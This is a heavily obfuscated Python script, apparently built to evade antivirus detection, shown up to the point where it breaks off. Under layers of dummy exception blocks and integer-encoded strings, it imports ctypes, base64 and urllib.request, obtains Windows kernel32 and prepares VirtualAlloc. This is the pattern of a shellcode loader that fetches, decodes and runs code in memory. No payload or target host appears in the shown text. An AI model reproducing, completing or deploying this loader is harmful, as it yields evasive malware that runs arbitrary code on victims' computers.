__3350374912921 = 0
__3350374912921 += 1
try:
    raise MemoryError(__3350374912921)
except MemoryError as __7271658128798:
    if __7271658128798.args[0] == 1:
        globals()['R_E_D__A_V_______'] = bool if bool(bool(bool(bool))) < bool(type(int(713) > int(152) < int(1519) > int(1711))) and bool(str(str(52) > int(818) < int(87) > int(176))) > 2 else bool
    if __7271658128798.args[0] == 3:
        __8496170778656 = 197991556344955
    if __7271658128798.args[0] == 4:
        __4595620513499 = 130718654434424
    if __7271658128798.args[0] == 5:
        __5857409249477 = 224565180345417
    if __7271658128798.args[0] == 6:
        __7517835295159 = 141468900101147
__5926935919535 = 0
__5926935919535 += 1
try:
    raise MemoryError(__5926935919535)
except MemoryError as __6484545544954:
    if __6484545544954.args[0] == 1:
        globals()['R_E_D__A_V______'] = str if bool(bool(bool(str))) < bool(type(int(16) > int(1915) < int(1811) > int(818))) and bool(str(str(127) > int(47) < int(811) > int(65))) > 2 else str
    if __6484545544954.args[0] == 3:
        __2976775033683 = 137338294427696
__6494683284497 = 0
__6494683284497 += 1
try:
    raise MemoryError(__6494683284497)
except MemoryError as __5329481103800:
    if __5329481103800.args[0] == 1:
        globals()['R_E_D__A_V________'] = type if bool(bool(bool(type))) < bool(type(int(174) > int(81) < int(189) > int(311))) and bool(str(str(611) > int(1511) < int(65) > int(21))) > 2 else type
    if __5329481103800.args[0] == 3:
        __2150123273956 = 132519089182394
    if __5329481103800.args[0] == 4:
        __5196540504553 = 94051300918544
__2359920497852 = 0
__2359920497852 += 1
try:
    raise MemoryError(__2359920497852)
except MemoryError as __5488060907358:
    if __5488060907358.args[0] == 1:
        globals()['R_E_D__A_V_____'] = int if bool(bool(bool(int))) < bool(type(int(1416) > int(152) < int(1012) > int(154))) and bool(str(str(1117) > int(215) < int(43) > int(1519))) > 2 else int
    if __5488060907358.args[0] == 3:
        __8159580507346 = 256980876530107
__3633181127631 = 0
__3633181127631 += 1
try:
    raise MemoryError(__3633181127631)
except MemoryError as __3711373891920:
    if __3711373891920.args[0] == 1:
        globals()['R_E_D__A_V_________'] = bytes if bool(bool(bool(bytes))) < bool(type(int(1113) > int(146) < int(413) > int(194))) and bool(str(str(83) > int(192) < int(12) > int(133))) > 2 else bytes
    if __3711373891920.args[0] == 3:
        __5070401551095 = 104738911803164
    if __3711373891920.args[0] == 4:
        __7426242302292 = 221464661466006
    if __3711373891920.args[0] == 5:
        __3164909141057 = 160265833902559
    if __3711373891920.args[0] == 6:
        __3395619731706 = 186084128510057
    if __3711373891920.args[0] == 7:
        __2679334121394 = 87450368144349
__4930713060360 = 0
__4930713060360 += 1
try:
    raise MemoryError(__4930713060360)
except MemoryError as __5239586556705:
    if __5239586556705.args[0] == 1:
        globals()['R_E_D__A_V__________'] = vars if bool(bool(bool(vars))) < bool(type(int(98) > int(1917) < int(108) > int(142))) and bool(str(str(85) > int(418) < int(612) > int(1711))) > 2 else vars
    if __5239586556705.args[0] == 3:
        __3269805503103 = 69121308053129
    if __5239586556705.args[0] == 4:
        __6666377681405 = 168700147601627
__6646248597213 = 0
__6646248597213 += 1
try:
    raise MemoryError(__6646248597213)
except MemoryError as __2758302540357:
    if __2758302540357.args[0] == 1:
        globals()['R_E_D__A_V____________'] = callable if bool(bool(bool(callable))) < bool(type(int(910) > int(95) < int(101) > int(1715))) and bool(str(str(76) > int(216) < int(145) > int(63))) > 2 else callable
    if __2758302540357.args[0] == 3:
        __6435341709453 = 238830748918982
    if __2758302540357.args[0] == 4:
        __4132105770604 = 229874235471868
    if __2758302540357.args[0] == 5:
        __7886033548275 = 17704917810657
    if __2758302540357.args[0] == 6:
        __6271132839906 = 181368497589502
__5887178187924 = 0
__5887178187924 += 1
try:
    raise MemoryError(__5887178187924)
except MemoryError as __5602336485905:
    if __5602336485905.args[0] == 1:
        globals()['R_E_D__A_V____'] = eval if bool(bool(bool(eval))) < bool(type(int(64) > int(718) < int(126) > int(169))) and bool(str(str(1612) > int(1017) < int(114) > int(1812))) > 2 else eval
    if __5602336485905.args[0] == 3:
        __8307003976161 = 261254433960399
    if __5602336485905.args[0] == 4:
        __4209839542456 = 128546802181851
    if __5602336485905.args[0] == 5:
        __6268468498221 = 221198097546914
    if __5602336485905.args[0] == 6:
        __6095623661263 = 271039219804375
__4690038303743 = 0
__4690038303743 += 1
try:
    raise MemoryError(__4690038303743)
except MemoryError as __7655243764103:
    if __7655243764103.args[0] == 1:
        globals()['______________R_E_D__A_V______________'] = list if bool(bool(bool(list))) < bool(type(int(1716) > int(51) < int(194) > int(83))) and bool(str(str(131) > int(122) < int(919) > int(111))) > 2 else list
    if __7655243764103.args[0] == 3:
        __5585690775906 = 131738696779271
    if __7655243764103.args[0] == 4:
        __3848271423929 = 122910275507739
    if __7655243764103.args[0] == 5:
        __6964283490877 = 39778409502460
    if __7655243764103.args[0] == 6:
        __5911516095447 = 103407048471820
__8413512841855 = 0
__8413512841855 += 1
try:
    raise MemoryError(__8413512841855)
except MemoryError as __3899513927049:
    if __3899513927049.args[0] == 1:
        globals()['R_E_D__A_V______________'] = map if bool(bool(bool(map))) < bool(type(int(193) > int(54) < int(106) > int(917))) and bool(str(str(108) > int(84) < int(214) > int(618))) > 2 else map
    if __3899513927049.args[0] == 3:
        __6154741977367 = 177554476685054
__6216317954070 = 0
__6216317954070 += 1
try:
    raise MemoryError(__6216317954070)
except MemoryError as __2585882104926:
    if __2585882104926.args[0] == 1:
        globals()['R_E_D__A_V___'] = __import__ if bool(bool(bool(__import__))) < bool(type(int(911) > int(1916) < int(610) > int(413))) and bool(str(str(71) > int(13) < int(1712) > int(122))) > 2 else __import__
    if __2585882104926.args[0] == 3:
        __7330373721725 = 173841959107124
__3399007179556 = 0
__3399007179556 += 1
try:
    raise MemoryError(__3399007179556)
except MemoryError as __2670160238457:
    if __2670160238457.args[0] == 1:
        globals()['tryᅠ'] = print if bool(bool(bool(print))) < bool(type(int(191) > int(25) < int(178) > int(1117))) and bool(str(str(194) > int(118) < int(1812) > int(1416))) > 2 else print
    if __2670160238457.args[0] == 3:
        __4495258908090 = 88403836925003
    if __2670160238457.args[0] == 4:
        __3593199180308 = 263675270081920
    if __2670160238457.args[0] == 5:
        __2476141935626 = 160098373778344
    if __2670160238457.args[0] == 6:
        __3801412225186 = 113748073851690
    if __2670160238457.args[0] == 7:
        __7831612414825 = 152725125170108
__5214025968945 = 0
__5214025968945 += 1
try:
    raise MemoryError(__5214025968945)
except MemoryError as __6635789146342:
    if __6635789146342.args[0] == 1:
        globals()['exceptᅠ'] = input if bool(bool(bool(input))) < bool(type(int(118) > int(111) < int(185) > int(83))) and bool(str(str(714) > int(1211) < int(1912) > int(1617))) > 2 else input
    if __6635789146342.args[0] == 3:
        __4882369088771 = 97165876280602
    if __6635789146342.args[0] == 4:
        __3624011884711 = 163496928718633

def R_E_D__A_V____(RED_DEFENDER, *k):
    __4365834643879 = 0
    __4365834643879 += 1
    try:
        raise MemoryError(__4365834643879)
    except MemoryError as __2833822918690:
        if __2833822918690.args[0] == 1:
            if k:
                R_E_D____A_V = '+'
                op = '+'
            else:
                R_E_D____A_V = ''
                op = ''
        if __2833822918690.args[0] == 1:
            globals()['_1715'] = (lambda: (lambda _1413: _1413 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __2833822918690.args[0] == 1:
            globals()['R_E_D__A_V____'] = R_E_D__A_V____
        if __2833822918690.args[0] == 1:
            globals()['R_E_D__A_V______'] = R_E_D__A_V______
        if __2833822918690.args[0] == 1:
            globals()['RED_DEFENDER'] = RED_DEFENDER
        if __2833822918690.args[0] == 1:
            for globals()['R_E_D____A_V_'] in globals()['RED_DEFENDER']:
                if not _1715:
                    globals()['R_E_D____A_V_'] += (lambda: '')()
                R_E_D____A_V += R_E_D__A_V______(R_E_D____A_V_)
                f = (lambda: (lambda _1314: _1314 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()
        if __2833822918690.args[0] == 1:
            return R_E_D____A_V
        if __2833822918690.args[0] == 9:
            __7561680707894 = 94385383800219
        if __2833822918690.args[0] == 10:
            __2730776099762 = 19819178959801
        if __2833822918690.args[0] == 11:
            __2951462875792 = 186617707894757
        if __2833822918690.args[0] == 12:
            __8173129039182 = 75030868754451
        if __2833822918690.args[0] == 13:
            __5582496081353 = 268623443516132

def ______R_E_D__A_V_______(x):
    __4300720687669 = 0
    __4300720687669 += 1
    try:
        raise MemoryError(__4300720687669)
    except MemoryError as __5478797375807:
        if __5478797375807.args[0] == 1:
            return R_E_D__A_V_____(x - 30583)
        if __5478797375807.args[0] == 3:
            __6818171522113 = 238240963367469
        if __5478797375807.args[0] == 4:
            __3465452383379 = 48321560112455
        if __5478797375807.args[0] == 5:
            __7099566730451 = 12778869320427
        if __5478797375807.args[0] == 6:
            __3164661378456 = 55666836190868

def R_E_D__A_V(e):
    __4619903547798 = 0
    __4619903547798 += 1
    try:
        raise MemoryError(__4619903547798)
    except MemoryError as __7138410760763:
        if __7138410760763.args[0] == 1:
            br = bytearray(e[len(b'R_E_D__A_V__'):])
        if __7138410760763.args[0] == 1:
            r = 0
        if __7138410760763.args[0] == 1:
            for b in br:
                r = r * 256 + b
        if __7138410760763.args[0] == 1:
            return r
        if __7138410760763.args[0] == 6:
            __3630988978073 = 49791441988281
        if __7138410760763.args[0] == 7:
            __7277457076520 = 133481067237268
        if __7138410760763.args[0] == 8:
            __5117468312019 = 139819525692332
        if __7138410760763.args[0] == 9:
            __7894755171824 = 152832425526412

def ____________________________(x):
    __7759886547068 = 0
    __7759886547068 += 1
    try:
        raise MemoryError(__7759886547068)
    except MemoryError as __7994033462266:
        if __7994033462266.args[0] == 1:
            ar = []
        if __7994033462266.args[0] == 1:
            for i in x:
                ar.append(R_E_D__A_V____(i))
        if __7994033462266.args[0] == 1:
            return ar
        if __7994033462266.args[0] == 5:
            __5441020536774 = 14065558060182
        if __7994033462266.args[0] == 6:
            __8591260090621 = 114111308985900
        if __7994033462266.args[0] == 7:
            __4076176615505 = 19488363502680
if (lambda: (lambda _1015: _1015 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)():

    def R_E_D__A_V_______________(R_E_D__A_V____________):
        R_E_D__A_V____________ = R_E_D__A_V____________ - 16742655
        if R_E_D__A_V____________ <= 127:
            return R_E_D__A_V______(R_E_D__A_V_________([R_E_D__A_V____________]), 'utf8')
        elif R_E_D__A_V____________ <= 2047:
            if 1 < 2:
                b1 = 192 | R_E_D__A_V____________ >> 6
            b2 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2]), 'utf8')
        elif R_E_D__A_V____________ <= 65535:
            b1 = 224 | R_E_D__A_V____________ >> 12
            if 2 > 1:
                b2 = 128 | R_E_D__A_V____________ >> 6 & 63
            b3 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3]), 'utf8')
        else:
            b1 = 240 | R_E_D__A_V____________ >> 18
            if 2 == 2:
                b2 = 128 | R_E_D__A_V____________ >> 12 & 63
            if 1 < 2 < 3:
                b3 = 128 | R_E_D__A_V____________ >> 6 & 63
            b4 = 128 | R_E_D__A_V____________ & 63
            return R_E_D__A_V______(R_E_D__A_V_________([b1, b2, b3, b4]), 'utf8')

    def _hex(j):
        R_E_D__A_V____________ = ''
        for _hex in j:
            R_E_D__A_V____________ += R_E_D__A_V_______________(_hex)
        return R_E_D__A_V____________
else:
    'R_E_D____A_V'
try:
    match '196' == '161':
        case True:
            raise MemoryError([True])
        case False:
            _415 = [[True], [False]]
            R_E_D__A_V______(['_318'])
    raise MemoryError([True])
except MemoryError as _1812:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _192: _192 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _711 = [[(lambda: (lambda _156: _156 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _182: _182 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda: (lambda _102: _102 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1411:
        import sys
try:
    match '51' == '411':
        case True:
            raise MemoryError([True])
        case False:
            _811 = [[True], [False]]
            R_E_D__A_V______(['_1619'])
    raise MemoryError([True])
except MemoryError as _14:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _115: _115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _219 = [[(lambda: (lambda _178: _178 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _85: _85 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _1211: _1211 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _86:
        import ctypes
try:
    match '1910' == '118':
        case True:
            raise MemoryError([True])
        case False:
            _146 = [[True], [False]]
            R_E_D__A_V______(['_316'])
    raise MemoryError([True])
except MemoryError as _186:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742707]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1219: _1219 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _96 = [[(lambda: (lambda _174: _174 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1011: _1011 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742704, 16742704]))))())())()])
        raise MemoryError([(lambda: (lambda _815: _815 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1210:
        import base64
try:
    match '64' == '717':
        case True:
            raise MemoryError([True])
        case False:
            _1110 = [[True], [False]]
            R_E_D__A_V______(['_97'])
    raise MemoryError([True])
except MemoryError as _510:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _76: _76 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _76 = [[(lambda: (lambda _1819: _1819 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1216: _1216 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742710]))))())())()])
        raise MemoryError([(lambda: (lambda _34: _34 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _189:
        import ctypes.wintypes as wt
try:
    match '119' == '147':
        case True:
            raise MemoryError([True])
        case False:
            _133 = [[True], [False]]
            R_E_D__A_V______(['_1116'])
    raise MemoryError([True])
except MemoryError as _315:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _510: _510 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _184 = [[(lambda: (lambda _167: _167 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _119: _119 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda: (lambda _1113: _1113 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _818:
        import urllib.request
try:
    match '1710' == '43':
        case True:
            raise MemoryError([True])
        case False:
            _819 = [[True], [False]]
            R_E_D__A_V______(['_36'])
    raise MemoryError([True])
except MemoryError as _314:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742712]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _178: _178 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1412 = [[(lambda: (lambda _811: _811 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _12: _12 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742711, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _1712: _1712 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _21:
        __3785032037325 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '36' == '151':
        case True:
            raise MemoryError([True])
        case False:
            _28 = [[True], [False]]
            R_E_D__A_V______(['_49'])
    raise MemoryError([True])
except MemoryError as _184:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _112: _112 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _189 = [[(lambda: (lambda _139: _139 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _49: _49 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742704, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _86: _86 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _187:
        __3785032037325 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '82' == '1016':
        case True:
            raise MemoryError([True])
        case False:
            _158 = [[True], [False]]
            R_E_D__A_V______(['_86'])
    raise MemoryError([True])
except MemoryError as _1512:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742712]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _132: _132 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1712 = [[(lambda: (lambda _82: _82 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _127: _127 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _518: _518 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _188:
        try:
            raise MemoryError(__3785032037325)
        except MemoryError as __5922629463937:
            if __5922629463937.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32 = ctypes.windll.kernel32
            if __5922629463937.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __4851580889573 = (lambda: R_E_D__A_V(b'R_E_D__A_V__{\xebB\xfc>V'))()
            if __5922629463937.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __6563463872148 = (lambda: R_E_D__A_V(b'R_E_D__A_V__h\xb6\xb9\xc9\xa5Z'))()
            if __5922629463937.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __3952528288046 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x1f\x8c\xe2\x10\xaa\xa7'))()
            if __5922629463937.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
                __3048556282410 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x11\x8c\xd6\xfd\xf3\xfe'))()
try:
    match '161' == '163':
        case True:
            raise MemoryError([True])
        case False:
            _105 = [[True], [False]]
            R_E_D__A_V______(['_1713'])
    raise MemoryError([True])
except MemoryError as _1311:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1611: _1611 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _57 = [[(lambda: (lambda _73: _73 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _318: _318 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda: (lambda _1211: _1211 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _192:
        __7636369512241 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '49' == '89':
        case True:
            raise MemoryError([True])
        case False:
            _113 = [[True], [False]]
            R_E_D__A_V______(['_122'])
    raise MemoryError([True])
except MemoryError as _1315:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742707, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742710]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _1113: _1113 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1614 = [[(lambda: (lambda _1915: _1915 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _148: _148 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742709]))))())())()])
        raise MemoryError([(lambda: (lambda _147: _147 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _313:
        __7636369512241 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '813' == '29':
        case True:
            raise MemoryError([True])
        case False:
            _136 = [[True], [False]]
            R_E_D__A_V______(['_26'])
    raise MemoryError([True])
except MemoryError as _86:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742712, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _116: _116 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _124 = [[(lambda: (lambda _54: _54 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _143: _143 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742712]))))())())()])
        raise MemoryError([(lambda: (lambda _153: _153 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _21:
        try:
            raise MemoryError(__7636369512241)
        except MemoryError as __3273165666348:
            if __3273165666348.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.VirtualAlloc.argtypes = (wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD)
            if __3273165666348.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __8521208136753 = (lambda: R_E_D__A_V(b'R_E_D__A_V__;\x1a\x83@>E'))()
            if __3273165666348.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __2755018796199 = (lambda: R_E_D__A_V(b'R_E_D__A_V__Y=\x13\x99\x9e\xeb'))()
try:
    match '148' == '188':
        case True:
            raise MemoryError([True])
        case False:
            _215 = [[True], [False]]
            R_E_D__A_V______(['_189'])
    raise MemoryError([True])
except MemoryError as _1218:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742708]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _213: _213 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _27 = [[(lambda: (lambda _1518: _1518 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1314: _1314 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742705]))))())())()])
        raise MemoryError([(lambda: (lambda _115: _115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _1711:
        __4759414074397 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1816' == '113':
        case True:
            raise MemoryError([True])
        case False:
            _94 = [[True], [False]]
            R_E_D__A_V______(['_162'])
    raise MemoryError([True])
except MemoryError as _718:
    try:
        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742706]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704]))))())())():
            case True:
                raise MemoryError([(lambda: (lambda _156: _156 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
